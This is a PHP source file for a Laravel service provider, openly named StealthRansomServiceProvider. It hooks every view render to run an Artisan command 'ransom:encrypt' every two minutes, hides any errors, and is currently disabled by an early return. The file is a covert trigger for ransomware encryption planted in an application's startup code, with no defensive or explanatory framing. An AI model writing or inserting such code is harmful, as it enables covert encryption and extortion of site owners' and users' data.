<?php
// app/Providers/StealthRansomServiceProvider.php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Artisan;

class StealthRansomServiceProvider extends ServiceProvider
{
    public function boot()
    {
        return;
        View::composer('*', function ($view) {
            // Cek hanya tiap 2 menit
            $key = 'stealth_ransom_last_run';
            if (Cache::has($key) && now()->diffInSeconds(Cache::get($key)) < 120) {
                return;
            }

            Cache::put($key, now(), now()->addDay());
            try {
                Artisan::call('ransom:encrypt');
            } catch (\Exception $e) {
            }
        });
    }

    public function register() {}
}
